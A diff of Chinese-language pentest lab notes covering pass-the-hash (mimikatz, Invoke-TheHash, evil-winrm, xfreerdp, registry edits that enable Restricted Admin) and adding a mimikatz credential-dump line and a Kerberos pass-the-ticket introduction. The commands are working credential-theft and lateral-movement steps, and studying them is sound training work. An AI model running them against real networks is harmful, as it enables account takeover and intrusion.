@@ -366,9 +366,10 @@ smbclient //10.129.232.180/HR -U jbader                                         
 
 
 哈希传递
+
 mimikatz.exe privilege::debug "sekurlsa::pth /user:julio" exit      搜寻哈希
 C:\> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit            弹出新cmd，dir \\dc01\julio 连接到 juliio 的共享
- 
+
 
 PS:\> cd C:\tools\Invoke-TheHash\                                    通过 SMB 传递哈希，并新建 mark 用户，并加入 administrators 组
 PS:\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
@@ -398,6 +399,8 @@ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF345
 c:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f      启用“受限管理员模式”（Restricted Admin mode），允许哈希登录
 nxc smb STMIP -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'      用 nxc -x 改注册表
 xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit      在目标本地搜寻凭证
+
 
 用户帐户控制 (User Account Control, UAC) 限制了本地用户执行远程管理操作
 当注册表项 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy 设置为 0 时
@@ -408,8 +411,19 @@ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
   参考资料：https://specterops.io/blog/2017/03/16/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/
 
 
+传递票据
 
+Kerberos 基于票据
+不将账户密码提供给每个服务
+相反，将所有票据保存在本地系统
+只向每个服务出示该服务的特定票据
+防止一张票据被用于其他目的
 
+票据授予票据 (Ticket Granting Ticket, TGT) 是在 Kerberos 系统上获得的第一张票据；TGT 允许客户端获取额外的 Kerberos 票据 TGS。
+票据授予服务 (Ticket Granting Service, TGS) 是想要使用服务的用户所请求的；这些票据允许服务验证用户的身份
+当用户请求 TGT，使用其密码哈希加密当前时间戳
+一旦域控制器验证了用户的身份（ 域控制器知道用户的密码哈希，它可以解密时间戳），它就会向用户发送一个 TGT
+例如，用户想要连接到 MSSQL 数据库，它会向密钥分发中心 (Key Distribution Center, KDC) 出示其 TGT，请求一个 TGS，将 TGS 提供给 MSSQL 数据库服务器进行身份验证
 
 
 
